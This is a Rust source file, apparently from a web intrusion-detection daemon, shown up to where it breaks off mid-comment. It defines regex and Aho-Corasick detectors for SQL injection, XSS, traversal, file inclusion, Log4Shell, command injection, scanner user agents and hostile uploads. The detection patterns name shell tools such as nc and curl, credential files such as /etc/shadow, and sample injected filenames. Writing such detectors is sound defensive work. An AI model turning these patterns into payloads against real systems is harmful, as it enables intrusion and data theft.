//! Heuristic detectors: regex-based pattern matching for common attacks.
//!
//! Each heuristic implements [`Heuristic`] and returns zero or more [`Signal`]s
//! for an event. Heuristics are fast (microseconds) and run on every event
//! that passes the rules engine. They never do network I/O.
//!
//! Performance (F5): a single Aho-Corasick automaton over literal trigger
//! tokens gates the regexes — a family's regex can only match if one of its
//! literals is present in the scanned text, so on clean traffic the engine
//! runs one SIMD-vectorized scan and skips all eight text regexes. The
//! URL-decoded path/query are computed once per event and shared.

use std::sync::LazyLock;

use aho_corasick::AhoCorasick;
use regex::Regex;

use crate::analysis::{Signal, SignalKind};
use crate::event::{Event, HttpData};

/// A heuristic detector.
pub trait Heuristic: Send + Sync {
    /// Stable name for logging/metrics.
    fn name(&self) -> &'static str;

    /// Prefilter gate bit (F5): the engine runs this detector only when the
    /// automaton found one of the family's trigger literals. `None` = always
    /// run (no text scan involved).
    fn gate_bit(&self) -> Option<u8> {
        None
    }

    /// Analyze an event, returning signals it detected.
    ///
    /// `text` carries the URL-decoded path/query (empty for non-HTTP events),
    /// computed once per event by the engine.
    fn analyze(&self, evt: &Event, text: &DecodedHttp<'_>) -> Vec<Signal>;
}

/// URL-decoded path and query, shared by all text detectors (F5), plus the
/// parsed request body (F10): multipart parts and urlencoded form values,
/// computed once per event.
#[derive(Default)]
pub struct DecodedHttp<'a> {
    /// Percent-decoded request path (`%27` → `'`, `+`/`%20` → space).
    pub path: String,
    /// Percent-decoded query string; empty when the event has no query.
    pub query: String,
    /// Parsed multipart parts (empty for non-multipart bodies).
    pub uploads: Vec<crate::multipart::UploadPart<'a>>,
    /// Parsed urlencoded form values (empty for non-form bodies).
    pub form: Vec<(String, String)>,
}

/// Multipart parts parsed per event — generous enough for real forms, tight
/// enough that a hostile body can't make the engine parse thousands.
const MAX_PARSE_PARTS: usize = 64;

impl<'a> DecodedHttp<'a> {
    fn of(http: &'a HttpData) -> Self {
        let (path, query) = http_text(http);
        let (uploads, form) = body_parts(http);
        Self {
            path,
            query,
            uploads,
            form,
        }
    }
}

/// Split a request body into (multipart parts, urlencoded values). Only the
/// declared `Content-Type` decides the parser; JSON bodies stay unparsed and
/// are text-scanned by the content heuristic.
fn body_parts(http: &HttpData) -> (Vec<crate::multipart::UploadPart<'_>>, Vec<(String, String)>) {
    let Some(body) = http.body.as_deref() else {
        return (Vec::new(), Vec::new());
    };
    if body.is_empty() {
        return (Vec::new(), Vec::new());
    }
    let Some(ct) = http.headers.get("content-type").map(|s| s.as_str()) else {
        return (Vec::new(), Vec::new());
    };
    let ct_lower = ct.to_ascii_lowercase();
    if ct_lower.starts_with("multipart/") {
        (
            crate::multipart::parse_multipart(ct, body, MAX_PARSE_PARTS),
            Vec::new(),
        )
    } else if ct_lower.contains("x-www-form-urlencoded") {
        (Vec::new(), crate::multipart::parse_urlencoded(body))
    } else {
        (Vec::new(), Vec::new())
    }
}

/// Prefilter gate bits, one per text-scanning detector family.
pub mod gate {
    /// SQL injection family.
    pub const SQLI: u8 = 1 << 0;
    /// Cross-site scripting family.
    pub const XSS: u8 = 1 << 1;
    /// Path traversal family.
    pub const TRAVERSAL: u8 = 1 << 2;
    /// Local file inclusion family.
    pub const LFI: u8 = 1 << 3;
    /// Log4Shell JNDI lookup family.
    pub const LOG4SHELL: u8 = 1 << 4;
    /// Command injection family.
    pub const CMD: u8 = 1 << 5;
    /// Sensitive/administrative path family.
    pub const SENSITIVE: u8 = 1 << 6;
    /// Bad crawler User-Agent family.
    pub const CRAWLER: u8 = 1 << 7;
}

/// Literal triggers per family: every regex alternative contains at least one
/// of its family's literals (case-insensitive), so a family whose triggers
/// are absent from all scanned fields cannot match. Keep in sync with the
/// `*_RE` regexes below — `coverage` proptests enforce the invariant.
struct FamilyPrefilter {
    ac: AhoCorasick,
    /// Gate bit per automaton pattern, parallel to the pattern list.
    bits: Vec<u8>,
}

impl FamilyPrefilter {
    fn build() -> Self {
        Self::compile(Self::base_patterns())
    }

    fn base_patterns() -> Vec<(String, u8)> {
        const P: &[(&str, u8)] = &[
            // sqli — branch 1 needs a quote; the others their keyword.
            ("'", gate::SQLI),
            ("union", gate::SQLI),
            ("drop", gate::SQLI),
            ("'1'", gate::SQLI),
            ("1=1", gate::SQLI),
            ("information_schema", gate::SQLI),
            ("benchmark(", gate::SQLI),
            // xss — one literal per regex alternative.
            ("<script", gate::XSS),
            ("javascript:", gate::XSS),
            ("onerror", gate::XSS),
            ("onload", gate::XSS),
            ("onclick", gate::XSS),
            ("onmouseover", gate::XSS),
            ("<img", gate::XSS),
            ("<iframe", gate::XSS),
            ("<svg", gate::XSS),
            ("alert(", gate::XSS),
            ("document.cookie", gate::XSS),
            ("eval(", gate::XSS),
            // path traversal (decoded form).
            ("../", gate::TRAVERSAL),
            ("..\\", gate::TRAVERSAL),
            ("..%2f", gate::TRAVERSAL),
            ("..%5c", gate::TRAVERSAL),
            ("%2e%2e", gate::TRAVERSAL),
            ("..;/", gate::TRAVERSAL),
            ("..;\\", gate::TRAVERSAL),
            ("/etc/passwd", gate::TRAVERSAL),
            ("/proc/self", gate::TRAVERSAL),
            // lfi.
            ("/etc/", gate::LFI),
            ("/proc/self/", gate::LFI),
            ("/var/log/", gate::LFI),
            ("/boot/grub", gate::LFI),
            ("/windows/system32", gate::LFI),
            ("/win.ini", gate::LFI),
            ("c:\\windows", gate::LFI),
            ("file://", gate::LFI),
            ("php://", gate::LFI),
            ("expect://", gate::LFI),
            ("data://", gate::LFI),
            // log4shell.
            ("${jndi:", gate::LOG4SHELL),
            // command injection — one trigger per shell metachar branch.
            (";", gate::CMD),
            ("|", gate::CMD),
            ("`", gate::CMD),
            ("$(", gate::CMD),
            ("&&", gate::CMD),
            // bad crawler (regex is a pure literal alternation). Sensitive-path
            // literals are appended below from lists.rs (shared with the pack
            // rules) so the two can never drift.
            ("sqlmap", gate::CRAWLER),
            ("nikto", gate::CRAWLER),
            ("nmap", gate::CRAWLER),
            ("masscan", gate::CRAWLER),
            ("zgrab", gate::CRAWLER),
            ("nessus", gate::CRAWLER),
            ("acunetix", gate::CRAWLER),
            ("dirbuster", gate::CRAWLER),
            ("gobuster", gate::CRAWLER),
            ("wpscan", gate::CRAWLER),
            ("hydra", gate::CRAWLER),
            ("metasploit", gate::CRAWLER),
            ("burp", gate::CRAWLER),
            ("httrack", gate::CRAWLER),
            ("libwww", gate::CRAWLER),
            ("python-requests", gate::CRAWLER),
            ("curl/", gate::CRAWLER),
            ("go-http-client", gate::CRAWLER),
            ("scrapy", gate::CRAWLER),
            ("crawler4j", gate::CRAWLER),
            ("semrush", gate::CRAWLER),
            ("ahrefs", gate::CRAWLER),
            // curated scanner tools (nginx-ultimate-bad-bot-blocker).
            ("zmap", gate::CRAWLER),
            ("rustscan", gate::CRAWLER),
            ("unicornscan", gate::CRAWLER),
            ("nuclei", gate::CRAWLER),
            ("dirsearch", gate::CRAWLER),
            ("feroxbuster", gate::CRAWLER),
            ("ffuf", gate::CRAWLER),
            ("wfuzz", gate::CRAWLER),
            ("arachni", gate::CRAWLER),
            ("openvas", gate::CRAWLER),
            ("havij", gate::CRAWLER),
            ("commix", gate::CRAWLER),
            ("xsser", gate::CRAWLER),
            ("dalfox", gate::CRAWLER),
            ("gospider", gate::CRAWLER),
            ("hakrawler", gate::CRAWLER),
            ("webbandit", gate::CRAWLER),
            ("emailcollector", gate::CRAWLER),
        ];
        let mut patterns: Vec<(String, u8)> =
            P.iter().map(|(p, g)| ((*p).to_string(), *g)).collect();
        patterns.extend(
            crate::lists::sensitive_path_literals().map(|lit| (lit.to_string(), gate::SENSITIVE)),
        );
        patterns
    }

    /// Scan one text field, setting bits for families whose triggers appear.
    ///
    /// Overlapping iteration matters: triggers from different families can
    /// overlap (`/.` vs `../` in `/../etc`), and non-overlapping semantics
    /// would let the first-reported trigger starve the other families' bits.
    fn scan_into(&self, text: &str, mask: &mut u8) {
        for m in self.ac.find_overlapping_iter(text) {
            *mask |= self.bits[m.pattern().as_usize()];
        }
    }

    /// Whether any of a family's triggers appear in `text`.
    #[cfg(test)]
    fn family_hit(&self, bit: u8, text: &str) -> bool {
        self.ac
            .find_overlapping_iter(text)
            .any(|m| self.bits[m.pattern().as_usize()] & bit != 0)
    }

    fn compile(patterns: Vec<(String, u8)>) -> Self {
        let ac = aho_corasick::AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(patterns.iter().map(|(p, _)| p.as_str()))
            .expect("static patterns compile");
        Self {
            ac,
            bits: patterns.iter().map(|(_, b)| *b).collect(),
        }
    }

    /// Prefilter with dataset literals merged in (F7.7): UA substrings gate
    /// CRAWLER, path fragments gate SENSITIVE.
    fn build_with_datasets(user_agents: &[String], paths: &[String]) -> Self {
        let mut patterns = Self::base_patterns();
        patterns.extend(
            user_agents
                .iter()
                .filter(|u| u.len() >= 4)
                .map(|u| (u.clone(), gate::CRAWLER)),
        );
        patterns.extend(
            paths
                .iter()
                .filter(|p| p.len() >= 3)
                .map(|p| (p.clone(), gate::SENSITIVE)),
        );
        Self::compile(patterns)
    }
}

static PREFILTER: LazyLock<arc_swap::ArcSwap<FamilyPrefilter>> =
    LazyLock::new(|| arc_swap::ArcSwap::from_pointee(FamilyPrefilter::build()));

/// Hot-reload dataset-driven literals (F7.7): the prefilter gains the
/// imported UA/path triggers and the sensitive-path / bad-crawler regexes
/// gain the imported alternatives. Called by the daemon at startup and on
/// `sentry_datasets_changed`; subsequent scans see the new sets atomically.
pub fn reload_dataset_lists(user_agents: &[String], paths: &[String]) {
    let uas: Vec<String> = user_agents
        .iter()
        .map(|u| u.trim().to_ascii_lowercase())
        .filter(|u| u.len() >= 4)
        .collect();
    let paths: Vec<String> = paths
        .iter()
        .map(|p| p.trim().to_ascii_lowercase())
        .filter(|p| p.len() >= 3)
        .collect();
    PREFILTER.store(std::sync::Arc::new(FamilyPrefilter::build_with_datasets(
        &uas, &paths,
    )));
    SENSITIVE_PATH_RE.store(std::sync::Arc::new(build_sensitive_path_re(&paths)));
    BAD_CRAWLER_RE.store(std::sync::Arc::new(build_bad_crawler_re(&uas)));
}

fn build_sensitive_path_re(extra: &[String]) -> Regex {
    let base = crate::lists::sensitive_paths_regex();
    if extra.is_empty() {
        return Regex::new(&base).expect("sensitive path patterns compile");
    }
    let extras = extra
        .iter()
        .map(|p| regex::escape(p))
        .collect::<Vec<_>>()
        .join("|");
    // The base is "(?i)(?:a|b|…)": splice the extras into the same group so
    // the semantics match the built-in paths exactly.
    let mut src = base.trim_end().to_string();
    if src.ends_with(')') {
        src.truncate(src.len() - 1);
        src.push('|');
        src.push_str(&extras);
        src.push(')');
    }
    Regex::new(&src).unwrap_or_else(|_| Regex::new(&base).expect("base patterns compile"))
}

fn build_bad_crawler_re(extra: &[String]) -> Regex {
    if extra.is_empty() {
        return Regex::new(BAD_CRAWLER_PATTERN).expect("bad crawler pattern compiles");
    }
    let extras = extra
        .iter()
        .map(|u| regex::escape(u))
        .collect::<Vec<_>>()
        .join("|");
    Regex::new(&format!("(?i)(?:{}|{})", BAD_CRAWLER_INNER, extras))
        .expect("bad crawler + dataset pattern compiles")
}

/// Built-in bad-crawler alternatives (kept verbatim from the original
/// literal list; dataset entries are appended by the daemon, F7.7).
const BAD_CRAWLER_INNER: &str = "sqlmap|nikto|nmap|masscan|zgrab|zmap|rustscan|unicornscan|nessus|acunetix|dirbuster|dirsearch|gobuster|feroxbuster|ffuf|wfuzz|wpscan|hydra|metasploit|burp|httrack|libwww|python-requests|curl/[0-9]|go-http-client|scrapy|crawler4j|semrush|ahrefs|nuclei|arachni|openvas|havij|commix|xsser|dalfox|gospider|hakrawler|webbandit|emailcollector";
const BAD_CRAWLER_PATTERN: &str = "(?i)(?:sqlmap|nikto|nmap|masscan|zgrab|zmap|rustscan|unicornscan|nessus|acunetix|dirbuster|dirsearch|gobuster|feroxbuster|ffuf|wfuzz|wpscan|hydra|metasploit|burp|httrack|libwww|python-requests|curl/[0-9]|go-http-client|scrapy|crawler4j|semrush|ahrefs|nuclei|arachni|openvas|havij|commix|xsser|dalfox|gospider|hakrawler|webbandit|emailcollector)";

/// Composite heuristic that runs all registered detectors.
pub struct HeuristicEngine {
    detectors: Vec<Box<dyn Heuristic>>,
}

impl Default for HeuristicEngine {
    fn default() -> Self {
        Self::with_defaults()
    }
}

impl HeuristicEngine {
    /// Create a new engine with the default set of detectors. Upload
    /// inspection (F10) starts **disabled** — call
    /// [`with_uploads_scan`](Self::with_uploads_scan) with the `[uploads]`
    /// projection to arm it.
    pub fn with_defaults() -> Self {
        let scan = crate::uploads::UploadsScan::default();
        Self {
            detectors: vec![
                Box::new(SqlInjection),
                Box::new(Xss),
                Box::new(PathTraversal),
                Box::new(Lfi),
                Box::new(Log4Shell),
                Box::new(CmdInjection),
                Box::new(SensitivePath),
                Box::new(BadCrawler),
                Box::new(EmptyUserAgent),
                Box::new(TcpScanner),
                Box::new(UploadFilename::new(scan.clone())),
                Box::new(UploadContent::new(scan.clone())),
                Box::new(UploadImage::new(scan)),
            ],
        }
    }

    /// Re-arm the upload detectors (F10) with a new `[uploads]` projection.
    /// Disabled scans make them zero-cost early returns.
    pub fn with_uploads_scan(mut self, scan: crate::uploads::UploadsScan) -> Self {
        self.detectors.retain(|d| !d.name().starts_with("upload_"));
        self.detectors
            .push(Box::new(UploadFilename::new(scan.clone())));
        self.detectors
            .push(Box::new(UploadContent::new(scan.clone())));
        self.detectors.push(Box::new(UploadImage::new(scan)));
        self
    }

    /// Run all detectors and collect signals.
    ///
    /// Text families are gated by the shared Aho-Corasick prefilter: on a
    /// clean request none of their trigger literals appear and no regex runs.
    pub fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let decoded = evt.http().map(DecodedHttp::of);
        let mut gates = 0u8;
        let prefilter = PREFILTER.load();
        if let (Some(http), Some(text)) = (evt.http(), decoded.as_ref()) {
            prefilter.scan_into(&text.path, &mut gates);
            prefilter.scan_into(&text.query, &mut gates);
            if let Some(ua) = &http.user_agent {
                prefilter.scan_into(ua, &mut gates);
            }
            if let Some(referrer) = &http.referer {
                prefilter.scan_into(referrer, &mut gates);
            }
            for v in http.headers.values() {
                prefilter.scan_into(v, &mut gates);
            }
        }
        let empty = DecodedHttp::default();
        let text = decoded.as_ref().unwrap_or(&empty);
        let mut out = Vec::new();
        for d in &self.detectors {
            if let Some(bit) = d.gate_bit() {
                if gates & bit == 0 {
                    continue;
                }
            }
            out.extend(d.analyze(evt, text));
        }
        out
    }

    /// Run every detector unconditionally (no prefilter gating).
    ///
    /// Test-only: the equivalence tests assert that gating never changes
    /// the signal set.
    #[cfg(test)]
    fn analyze_ungated(&self, evt: &Event) -> Vec<Signal> {
        let decoded = evt.http().map(DecodedHttp::of);
        let empty = DecodedHttp::default();
        let text = decoded.as_ref().unwrap_or(&empty);
        self.detectors
            .iter()
            .flat_map(|d| d.analyze(evt, text))
            .collect()
    }
}

// ── Compiled regexes (LazyLock: auto-derefs to Regex) ────────────────────

/// Percent-decode a URL component and convert `+` to space.
///
/// Attackers routinely URL-encode payloads to bypass naive regex (`%27` for
/// `'`, `%20` or `+` for space). Heuristics run on the decoded form so the
/// patterns see the attacker's intent, not the transport encoding.
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hi = hex_val(bytes[i + 1]);
                let lo = hex_val(bytes[i + 2]);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h << 4) | l);
                    i += 3;
                } else {
                    out.push(bytes[i]);
                    i += 1;
                }
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Decode a hex digit to its numeric value.
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Decode both the path and the query of an HTTP event into a single
/// normalized string suitable for regex matching.
fn http_text(http: &HttpData) -> (String, String) {
    (
        url_decode(http.path.as_str()),
        http.query.as_deref().map(url_decode).unwrap_or_default(),
    )
}

static SQLI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:'|"")(?:\s|--|/\*|#).*(?:or|union|select|insert|update|delete|drop|exec)\b|(?:union\s+select)|(?:;\s*drop)|(?:'\s+or\s+'1'|'1'\s*=\s*'1'|or\s+1=1)|(?:information_schema)|(?:benchmark\s*\()"#).unwrap()
});

static XSS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:<script|javascript:|onerror\s*=|onload\s*=|onclick\s*=|onmouseover\s*=|<img[^>]+src\s*=|<iframe|<svg/onload|alert\s*\(|document\.cookie|eval\s*\()").unwrap()
});

static PATH_TRAVERSAL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:\.\.[/\\]|\.\.%2f|\.\.%5c|%2e%2e[/\\]|%2e%2e%2f|%2e%2e%5c|\.\.;[/\\]|/etc/passwd|/proc/self)").unwrap()
});

static LFI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|hosts|group|nginx)|/proc/self/(?:environ|fd/|status|cmdline)|/var/log/[a-z]|/boot/grub|/windows/system32|/win\.ini|c:\\\\windows|file://|php://filter|php://input|expect://|data://)").unwrap()
});

static LOG4SHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\$\{jndi:(?:ldap|ldaps|rmi|dns|iiop|nis|nds|corba)").unwrap()
});

static CMD_INJECTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:;\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:\|\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:`[^`]+`)|(?:\$\([^)]+\))|(?:&&\s*(?:cat|ls|id|whoami))").unwrap()
});

static SENSITIVE_PATH_RE: LazyLock<arc_swap::ArcSwap<Regex>> =
    LazyLock::new(|| arc_swap::ArcSwap::from_pointee(build_sensitive_path_re(&[])));

static BAD_CRAWLER_RE: LazyLock<arc_swap::ArcSwap<Regex>> =
    LazyLock::new(|| arc_swap::ArcSwap::from_pointee(build_bad_crawler_re(&[])));

// ── Detectors ────────────────────────────────────────────────────────────

/// SQL injection patterns.
pub struct SqlInjection;
impl Heuristic for SqlInjection {
    fn name(&self) -> &'static str {
        "sqli"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::SQLI)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if SQLI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::SqlInjection,
                    weight: 60,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// XSS patterns.
pub struct Xss;
impl Heuristic for Xss {
    fn name(&self) -> &'static str {
        "xss"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::XSS)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if XSS_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Xss,
                    weight: 45,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Path traversal.
pub struct PathTraversal;
impl Heuristic for PathTraversal {
    fn name(&self) -> &'static str {
        "path_traversal"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::TRAVERSAL)
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        if PATH_TRAVERSAL_RE.is_match(&text.path) || PATH_TRAVERSAL_RE.is_match(&text.query) {
            let path = evt.http().map(|h| h.path.clone()).unwrap_or_default();
            return vec![Signal {
                kind: SignalKind::PathTraversal,
                weight: 40,
                detail: Some(path),
            }];
        }
        vec![]
    }
}

/// Local file inclusion — attempts to read system files via path manipulation.
pub struct Lfi;
impl Heuristic for Lfi {
    fn name(&self) -> &'static str {
        "lfi"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::LFI)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if LFI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Lfi,
                    weight: 50,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Log4Shell.
pub struct Log4Shell;
impl Heuristic for Log4Shell {
    fn name(&self) -> &'static str {
        "log4shell"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::LOG4SHELL)
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        for t in [
            text.path.as_str(),
            text.query.as_str(),
            http.user_agent.as_deref().unwrap_or(""),
            http.referer.as_deref().unwrap_or(""),
        ] {
            if LOG4SHELL_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("matched: {t}")),
                }];
            }
        }
        for (k, v) in &http.headers {
            if LOG4SHELL_RE.is_match(v) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("header {k}")),
                }];
            }
        }
        vec![]
    }
}

/// Command injection.
pub struct CmdInjection;
impl Heuristic for CmdInjection {
    fn name(&self) -> &'static str {
        "cmd_injection"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::CMD)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if CMD_INJECTION_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Rce,
                    weight: 70,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Sensitive path access.
pub struct SensitivePath;
impl Heuristic for SensitivePath {
    fn name(&self) -> &'static str {
        "sensitive_path"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::SENSITIVE)
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        if SENSITIVE_PATH_RE
            .load()
            .is_match(&http.path.to_ascii_lowercase())
        {
            return vec![Signal {
                kind: SignalKind::SensitivePath,
                weight: 30,
                detail: Some(http.path.clone()),
            }];
        }
        vec![]
    }
}

/// Bad crawler User-Agent.
pub struct BadCrawler;
impl Heuristic for BadCrawler {
    fn name(&self) -> &'static str {
        "bad_crawler"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::CRAWLER)
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let ua = match &http.user_agent {
            Some(u) => u.to_ascii_lowercase(),
            None => return vec![],
        };
        if BAD_CRAWLER_RE.load().is_match(&ua) {
            return vec![Signal {
                kind: SignalKind::BadCrawler,
                weight: 40,
                detail: Some(http.user_agent.clone().unwrap_or_default()),
            }];
        }
        vec![]
    }
}

/// Empty User-Agent.
pub struct EmptyUserAgent;
impl Heuristic for EmptyUserAgent {
    fn name(&self) -> &'static str {
        "empty_ua"
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        match &http.user_agent {
            None => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("missing".into()),
            }],
            Some(ua) if ua.trim().is_empty() => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("empty".into()),
            }],
            _ => vec![],
        }
    }
}

/// Passive TCP SYN fingerprint match (F3.2): flags captured SYNs whose
/// `window:options:MSS:wscale` code matches a known high-rate scanner
/// (masscan / zmap / nmap-style probes).
pub struct TcpScanner;
impl Heuristic for TcpScanner {
    fn name(&self) -> &'static str {
        "tcp_scanner"
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp<'_>) -> Vec<Signal> {
        let code = match evt.tcp().and_then(|t| t.fingerprint.as_deref()) {
            Some(c) => c,
            None => return vec![],
        };
        match crate::tcpfp::scanner_name(code) {
            Some(tool) => vec![Signal {
                kind: SignalKind::TcpScanner,
                weight: 30,
                detail: Some(format!("{code} ({tool})")),
            }],
            None => vec![],
        }
    }
}

// ── Upload detectors (F10) ───────────────────────────────────────────────

/// Signal weight under the current `[uploads] mode`: full weights in
/// `enforce`, zero in `shadow` (detection still logs and metricizes).
fn upload_weight(scan: &crate::uploads::UploadsScan, base: u8) -> u8 {
    if scan.enforce {
        base
    } else {
        0
    }
}

/// Match an attack-text regex family over upload-borne text and return the
/// corresponding reused `SignalKind`/weight pair (same weights as the URL
/// counterparts — the attack is the same, only the surface differs).
fn text_family_match(text: &str) -> Option<(SignalKind, u8, &'static str)> {
    if SQLI_RE.is_match(text) {
        return Some((SignalKind::SqlInjection, 60, "sql"));
    }
    if XSS_RE.is_match(text) {
        return Some((SignalKind::Xss, 45, "xss"));
    }
    if LOG4SHELL_RE.is_match(text) {
        return Some((SignalKind::Log4Shell, 80, "log4shell"));
    }
    if CMD_INJECTION_RE.is_match(text) {
        return Some((SignalKind::Rce, 70, "cmd"));
    }
    if LFI_RE.is_match(text) {
        return Some((SignalKind::Lfi, 50, "lfi"));
    }
    if PATH_TRAVERSAL_RE.is_match(text) {
        return Some((SignalKind::PathTraversal, 40, "traversal"));
    }
    None
}

/// Injection patterns in uploaded **filenames** (`../../shell.php`,
/// `img'.jpg" OR 1=1--`, `${jndi:…}.png`) and hostile extension tricks
/// (double extensions, null bytes, server-side scripts).
pub struct UploadFilename {
    scan: crate::uploads::UploadsScan,
}

impl UploadFilename {
    /// Build with an `[uploads]` projection.
    pub fn new(scan: crate::uploads::UploadsScan) -> Self {
        Self { scan }
    }
}

impl Heuristic for UploadFilename {
    fn name(&self) -> &'static str {
        "upload_filename"
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp<'_>) -> Vec<Signal> {
        if !self.scan.enabled {
            return vec![];
        }
        for part in &text.uploads {
            let Some(filename) = part.filename.as_deref() else {
                continue;
            };
            let decoded = crate::multipart::decode_component(filename);
            if let Some((kind, base, family)) = text_family_match(&decoded) {
                return vec![Signal {
                    kind,
                    weight: upload_weight(&self.scan, base),
                    detail: Some(format!("upload filename {family}: {filename}")),
                }];
            }
            if decoded.contains('\0') || decoded.contains("../") || decoded.contains("..\\") {
                return vec![Signal {
                    kind: SignalKind::PathTraversal,
                    weight: upload_weight(&self.scan, 40),
                    detail: Some(format!("upload filename traversal: {filename}")),
                }];
            }
            if crate::uploads::extension(Some(&decoded))
                .is_some_and(|ext| self.scan.blocked_extensions.contains(&ext))
            {
                return vec![Signal {
                    kind: SignalKind::UploadExecutable,
                    weight: upload_weight(&self.scan, crate::analysis::UPLOAD_EXECUTABLE_WEIGHT),
                    detail: Some(format!("blocked upload extension: {filename}")),
                }];
            }
            if let Some(name) = filename.rsplit_once('.').map(|(base, _)| base) {
                if crate::uploads::extension(Some(name))
                    .is_some_and(|ext| self.scan.blocked_extensions.contains(&ext))
                {
                    return vec![Signal {
                        kind: SignalKind::UploadExecutable,
                        weight: upload_weight(
                            &self.scan,
                            crate::analysis::UPLOAD_EXECUTABLE_WEIGHT,
                        ),
                        detail: Some(format!("double blocked extension: {filename}")),
                    }];
                }
            }
        }
        vec![]
    }
}

/// Injection patterns inside upload **content**: multipart form fields,
/// textual files (SVG/HTML/JSON uploads), urlencoded form values and —
/// when `[uploads] scan_json` is on — raw JSON bodies.
pub struct UploadContent {
    scan: crate::uploads::UploadsScan,
}

impl UploadContent {
    /// Build with an `[uploads]` projection.
    pub fn new(scan: crate::uploads::UploadsScan) -> Self {
        Self { scan }
    }

    fn scan_piece(&self, label: String, raw: &[u8]) -> Vec<Signal> {
        let text = String::from_utf8_lossy(&raw[..raw.len().min(crate::uploads::TEXT_SCAN_CAP)]);
        match text_family_match(&text) {
            Some((kind, base, family)) => vec![Signal {
                kind,
                weight: upload_weight(&self.scan, base),
                detail: Some(format!("{label}: {family}")),
            }],
            None => vec![],
        }
    }
}

impl Heuristic for UploadContent {
    fn name(&self) -> &'static str {
        "upload_content"
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp<'_>) -> Vec<Signal> {
        if !self.scan.enabled {
            return vec![];
        }
        for part in &text.uploads {
            if !crate::multipart::is_scannable_text(part.content_type.as_deref(), part.content) {
                continue;
            }
            let label = match (part.name.as_deref(), part.filename.as_deref()) {
                (_, Some(f)) => format!("upload file {f}"),
                (Some(n), None) => format!("upload field {n}"),
                (None, None) => "upload part".to_string(),
            };
            let sigs = self.scan_piece(label, part.content);
            if !sigs.is_empty() {
                return sigs;
            }
        }
        for (name, value) in &text.form {
            let sigs = self.scan_piece(format!("form field {name}"), value.as_bytes());
            if !sigs.is_empty() {
                return sigs;
            }
        }
        if self.scan.scan_json {
            if let Some(http) = evt.http() {
                if let Some(body) = http.body.as_deref() {
                    if crate::multipart::looks_like_json(
                        http.headers.get("content-type").map(|s| s.as_str()),
                        body,
                    ) {
                        let sigs = self.scan_piece("json body".to_string(), body);
                        if !sigs.is_empty() {
                            return sigs;
                        }
                    }
                }
            }
        }
        vec![]
    }
}

/// Malicious **file content** (F10): magic bytes that disagree with the
